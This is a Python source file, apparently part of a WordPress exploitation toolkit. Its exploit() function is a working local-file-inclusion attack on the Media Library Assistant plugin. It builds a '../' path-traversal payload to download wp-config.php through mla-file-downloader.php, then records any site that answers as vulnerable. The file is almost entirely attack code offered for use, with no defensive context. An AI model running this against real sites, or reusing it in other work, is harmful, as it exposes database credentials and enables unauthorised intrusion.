import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(
        os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request

except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")


def exploit(url):
    if not (url.startswith('https://') or url.startswith('http://')):
        if url.endswith('/'):
            url = "http://" + url.strip('/')
        # url = 'http://' + url

    req = request(url)
    found = []

    try:
        x = "{0}/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file={1}"
        payload = "../" * int(x.count('/') - 1) + "wp-config.php"
        r = req.get(x.format(url, payload))
        # print(r.url)
        if r.status_code == 200:
            print(colors.yellow +
                  "[+] ==> Media Library Assistant %s Vulnerable" % url)
            found.append({
                "url": url,
                "type": "Media Library Assistant LFI",
                "status": "Vulnerable",
                "payload": x.format(url, payload)
            })
            json_me(url, "Media Library Assistant LFI", found)
        else:
            print(colors.red +
                  "[-] Media Library Assistant ==> %s Not Vulnerable" % url)
    except Exception as e:
        print(e)
